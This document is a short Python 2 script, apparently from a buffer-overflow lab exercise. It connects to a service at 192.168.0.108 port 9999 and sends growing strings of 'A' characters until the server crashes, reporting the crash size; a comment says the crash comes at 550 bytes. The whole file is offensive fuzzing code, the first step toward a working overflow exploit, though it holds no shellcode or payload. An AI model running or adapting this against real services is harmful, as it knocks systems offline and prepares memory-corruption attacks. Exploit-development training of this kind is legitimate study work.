'''
The server will crash with 550 bytes
'''
import socket,time

buf = 'A'
contador = 100
while contador < 1000:
    try:
        buffer = buf * contador
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('192.168.0.108',9999))
        sock.recv(1024)
        sock.sendall(str(buffer))
        print '[+] {} bytes sended'.format(len(buffer))
        sock.recv(1024)
        sock.close()
        contador += 50
    except Exception as e:
        print '[+] The server has crashed at {} bytes'.format(len(buffer))
        exit()
